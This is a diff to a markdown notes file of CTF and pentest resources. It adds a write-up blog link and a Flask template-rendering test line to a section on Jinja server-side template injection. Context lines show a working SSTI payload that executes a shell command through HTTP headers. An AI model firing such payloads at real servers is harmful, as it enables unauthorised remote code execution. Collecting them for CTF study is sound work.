@@ -32,6 +32,7 @@
     - https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html
     - https://hub.docker.com/r/bkimminich/juice-shop
 - [IppSec \- HackTheBox Writeups](https://ippsec.rocks/)
+- [Tags \| 0xdf hacks stuff](https://0xdf.gitlab.io/tags.html)
 
 # domain names
 
@@ -275,6 +276,8 @@ Clone:
 - jinja
     - [CTFtime\.org / zer0pts CTF 2020 / notepad / Writeup](https://ctftime.org/writeup/18597)
     ```
+    with flask.Flask('').app_context(): flask.render_template_string("{{2+2}}")
+
     GET /ttttt?cmd=cat%20flag HTTP/1.1
     Host: {{url_for.__globals__.os.popen(request.args.cmd).read()}}
     Referer: http://{{url_for.__globals__.os.popen(request.args.cmd).read()}}/
